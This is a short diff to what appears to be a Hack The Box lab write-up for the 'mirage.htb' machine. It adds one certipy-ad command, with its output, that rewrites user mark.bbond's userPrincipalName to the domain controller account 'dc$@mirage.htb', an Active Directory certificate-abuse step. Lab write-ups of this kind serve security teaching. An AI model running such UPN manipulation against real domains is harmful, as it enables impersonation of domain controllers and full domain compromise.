@@ -860,6 +860,17 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 Ill first just show the currennt UPN value of the `mark.bbond` account
 
+```python
+❯❯❯ faketime -f +7h certipy-ad account -u 'mirage-service$mirage.htb' -k -no-pass -dc-ip '10.129.232.163' -upn 'dc$@mirage.htb' -user 'mark.bbond' update -target dc01.mirage.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'mark.bbond':
+    userPrincipalName                   : dc$@mirage.htb
+[*] Successfully updated 'mark.bbond'
+```
+
+Then ill modify the accounts UPN
+
 
 
 
